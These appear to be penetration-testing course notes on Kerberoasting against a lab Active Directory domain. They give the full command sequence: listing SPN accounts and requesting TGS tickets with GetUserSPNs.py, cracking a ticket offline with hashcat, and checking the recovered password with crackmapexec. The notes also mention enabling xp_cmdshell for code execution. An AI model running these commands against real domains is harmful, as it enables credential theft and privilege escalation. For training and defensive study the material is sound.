## Kerberoasting Overview
Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.
Any domain user can request a Kerberos ticket for any service account in the same domain.
All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
The ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

## Kerberoasting - Performing the Attack
Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

Several tools can be utilized to perform the attack:
- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

---
## Performing the Attack
## Kerberoasting with GetUserSPNs.py
**!!** A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

#### Listing SPN Accounts with GetUserSPNs.py
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
**!!** If a user is part of Domain Admins group (We can see this in the output int the MemberOf column), we should look to crack their password for an easy win.
#### Requesting all TGS Tickets
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
#### Requesting a Single TGS ticket
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

#### Saving the TGS Ticket to an Output File
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**!!** Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.
```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

---
#### Testing Authentication against a Domain Controller
```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```



